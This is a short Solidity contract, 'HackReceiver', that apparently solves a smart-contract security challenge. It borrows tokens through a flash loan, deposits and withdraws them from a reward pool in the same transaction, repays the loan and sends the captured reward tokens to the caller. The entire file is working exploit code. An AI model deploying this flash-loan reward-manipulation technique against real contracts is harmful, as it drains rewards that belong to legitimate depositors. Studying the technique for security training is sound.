pragma solidity ^0.6.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract HackReceiver {

    address public rewardPool;
    address public lendingPool;
    address public rewardToken;
    address public liquidityToken;

    constructor (address _rewardPool, address _lendingPool, address _liquidityToken, address _rewardToken) public {
        rewardPool = _rewardPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        lendingPool = _lendingPool;
    }

    function attack(uint256 amount) external {
        FlashLoanerPool(lendingPool).flashLoan(amount);
        uint256 amount = IERC20(rewardToken).balanceOf(address(this));
        IERC20(rewardToken).transfer(msg.sender, amount);
    }

    // called by flashLoan contract
    function receiveFlashLoan(uint256 amount) external {
        IERC20(liquidityToken).approve(rewardPool, amount);
        TheRewarderPool(rewardPool).deposit(amount);
        TheRewarderPool(rewardPool).withdraw(amount);
        IERC20(liquidityToken).transfer(msg.sender, amount);
    }
}